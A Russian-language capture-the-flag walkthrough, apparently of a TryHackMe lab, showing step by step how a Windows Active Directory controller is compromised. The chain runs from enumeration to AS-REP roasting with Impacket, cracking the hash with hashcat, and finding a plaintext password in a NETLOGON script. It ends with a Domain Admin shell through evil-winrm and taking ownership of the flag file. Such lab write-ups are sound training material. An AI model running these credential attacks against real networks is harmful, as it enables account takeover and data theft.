сначало как обычно сканируем nmap

```bash
nmap -sV -sC -Pn -T4 10.10.56.127
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-27 11:28 EEST
Nmap scan report for 10.10.56.127
Host is up (0.059s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-27 08:28:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-time: 
|   date: 2025-09-27T08:28:33
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.46 seconds
```

Потом я использую утилиту для енумирейта:

```bash
enum4linux -u vulnnet-rst.local\\guest -a 10.21.128.81
"my" variable $which_output masks earlier declaration in same scope at ./enum4linux.pl line 280.
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep 27 11:37:43 2025

 =========================================( Target Information )=========================================

Target ........... 10.21.128.81
RID Range ........ 500-550,1000-1050
Username ......... 'vulnnet-rst.local\guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.21.128.81 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.21.128.81 )================================

Looking up status of 10.21.128.81
No reply from 10.21.128.81

 ===================================( Session Check on 10.21.128.81 )===================================


[E] Server doesn't allow session using username 'vulnnet-rst.local\guest', password ''.  Aborting remainder of tests.

hlib@hlib:~/vulnnet$ enum4linux -u vulnnet-rst.local\\guest -a 10.10.56.127
"my" variable $which_output masks earlier declaration in same scope at ./enum4linux.pl line 280.
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep 27 11:38:14 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.56.127
RID Range ........ 500-550,1000-1050
Username ......... 'vulnnet-rst.local\guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.56.127 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.56.127 )================================

Looking up status of 10.10.56.127
No reply from 10.10.56.127

 ===================================( Session Check on 10.10.56.127 )===================================


[+] Server 10.10.56.127 allows sessions using username 'vulnnet-rst.local\guest', password ''


 ================================( Getting domain SID for 10.10.56.127 )================================

Domain Name: VULNNET-RST
Domain Sid: S-1-5-21-1589833671-435344116-4136949213

[+] Host is part of a domain (not a workgroup)


 ===================================( OS information on 10.10.56.127 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.56.127 from srvinfo: 
	10.10.56.127   Wk Sv PDC Tim NT     
	platform_id     :	500
	os version      :	10.0
	server type     :	0x80102b


 =======================================( Users on 10.10.56.127 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.10.56.127 )=================================

do_connect: Connection to 10.10.56.127 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.56.127

//10.10.56.127/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.56.127/C$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.56.127/IPC$	Mapping: N/A Listing: N/A Writing: N/A
//10.10.56.127/NETLOGON	Mapping: OK Listing: DENIED Writing: N/A
//10.10.56.127/SYSVOL	Mapping: OK Listing: DENIED Writing: N/A
//10.10.56.127/VulnNet-Business-Anonymous	Mapping: OK Listing: OK Writing: N/A
//10.10.56.127/VulnNet-Enterprise-Anonymous	Mapping: OK Listing: OK Writing: N/A
```

От сюда я узнаю юзеров и share names

Далее я хочу посмотреть полный вписок юзеров, что бы сформировать список для дальнейшей атаки:

```bash
python3 lookupsid.py vulnnet-rst.local/guest@10.10.56.127
Impacket v0.13.0.dev0+20250926.155809.77988233 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.10.56.127
[*] StringBinding ncacn_np:10.10.56.127[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

Я использую Impacket это известный набор скриптов для работы с AD.

Так же моэно использовать kerbrute.

Я формирую с полученых юзеров список, беру не всех, а тольбко те, что мне интересны:

```bash
Enterprise
Administrator
krbtgt
DnsAdmins
a-whitehat
t-skid
j-goldenhand
j-leet
```

После чего я использую скрипт с Impacket и получаю хеш:

```bash
python3 GetNPUsers.py vulnnet-rst.local/ -usersfile ../../../vulnnet/users.txt 
Impacket v0.13.0.dev0+20250926.155809.77988233 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:7658a5cb8e2278fe0fae10627c374316$5f263f3207ebb7b8ba47dc8e9aeb66e9b797f260a468f73f7e7a72217d59ccc1765ca51652c7d0adcd9c742a95ec9a51f877d260e80dc892cae673bf13a980131ad551b204b0975381d6d8a0b3e68863d8bb77f2aa625c1c87cb0005d194fe1c8b5b92fc82f974d43cfa0c0e47596cb59d97b4c4de1b810cc1**********************************************************************************************888
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Мне нужно взламать его, для этого я буду юзать hashcat какой метод использовать я всмотрю тут: https://hashcat.net/wiki/doku.php?id=example_hashes#:~:text=Kerberos%205%2C%20etype%2023%2C%20AS%2DREP

Помещаяю зеш в файл и ломаю, для взлопа использую всем известный список:

```bash
hashcat -m 18200 hash.txt ../rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-8265U CPU @ 1.60GHz, 6863/13791 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: ../rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:7658a5cb8e2278fe0fae10627c374316$5f263f3207ebb7b8ba47dc8e9aeb66e9b797f260a468f73f7e7a72217d59ccc1765ca51652c7d0adcd9c742a95ec9a51f877d260e80dc892cae673bf13a980131ad551b204b0975381d6d8a0b3e68863d8bb77f2aa625c1c87cb0005d194fe1c8b5b92fc82f974d43cfa0c0e47596cb59d97b4c4de1b810cc176b914125f**************************************************************************:tj0******
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:7658a5cb8e22...396783
Time.Started.....: Sat Sep 27 11:53:51 2025 (1 sec)
Time.Estimated...: Sat Sep 27 11:53:52 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2550.6 kH/s (1.97ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3178496/14344384 (22.16%)
Rejected.........: 0/3178496 (0.00%)
Restore.Point....: 3170304/14344384 (22.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: tkwv8g1yi3 -> tj0302
Hardware.Mon.#1..: Temp: 78c Util: 76%

Started: Sat Sep 27 11:53:50 2025
Stopped: Sat Sep 27 11:53:54 2025
```

Получаю пароль, по нему теперь я могу попробовать залогинится по smb:

```bash
smbclient -L vulnnet-rst.local --user t-skid
Password for [WORKGROUP\t-skid]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available

smbclient \\\\10.10.56.127\\NETLOGON -U vulnnet-rst.local\\t-skid
Password for [VULNNET-RST.LOCAL\t-skid]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 01:15:49 2021
  ..                                  D        0  Wed Mar 17 01:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 01:18:14 2021

		8771839 blocks of size 4096. 4525006 blocks available
smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)
```

Получаю файл, в этом файле я нахожу пароль от другого юзера:

```bash 
strUserNTName = "a-whitehat"
strPassword = "bNdKVkj******"
```
Далее я логинюсь с этого юзера с помощю evil-winrm:

```bash
vil-winrm -i 10.10.56.127 -u a-whitehat -p bNdKV********
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> Get-ADUser $env:username -Properties MemberOf


DistinguishedName : CN=Alexa Whitehat,CN=Users,DC=vulnnet-rst,DC=local
Enabled           : True
GivenName         : Alexa
MemberOf          : {CN=Domain Admins,CN=Users,DC=vulnnet-rst,DC=local}
Name              : Alexa Whitehat
ObjectClass       : user
ObjectGUID        : ee9c8a94-ef5c-4dc6-a397-b1a8176f167f
SamAccountName    : a-whitehat
SID               : S-1-5-21-1589833671-435344116-4136949213-1105
Surname           : Whitehat
UserPrincipalName : a-whitehat@vulnnet-rst.local
```

Вижу, что юзер то у нас админ, от бы так в жизни везло)

```powershell
Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content
THM{726b7c0baaac14*******************}
```
При попытке получить второй флаг у меня нету прав на просмотр:

```powershell
:\Users\Administrator\Desktop> more system.txt
Access to the path 'C:\Users\Administrator\Desktop\system.txt' is denied.
At line:7 char:9
+         Get-Content $file | more.com
+         ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admini...ktop\system.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Проверяем права на файл:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> icacls "C:\Users\Administrator\Desktop\system.txt"
C:\Users\Administrator\Desktop\system.txt NT AUTHORITY\SYSTEM:(F)
                                          VULNNET-RST\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
```

Видим, что нам нужно зайти из под Administrator

Но это долго, нужно было бы выкачивать хеши, ломать есть более быстрый способ, тем более мы знаем, что наш юзер имеет админские права:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> takeown /F "C:\Users\Administrator\Desktop\system.txt"

SUCCESS: The file (or folder): "C:\Users\Administrator\Desktop\system.txt" now owned by user "VULNNET-RST\a-whitehat".
Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
vulnnet-rst\a-whitehat
*Evil-WinRM* PS C:\Users\Administrator\Desktop> icacls "C:\Users\Administrator\Desktop\system.txt" /grant a-whitehat:F
processed file: C:\Users\Administrator\Desktop\system.txt
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> more system.txt
THM{16f45e3934293a576******************}
```

Вот и все.
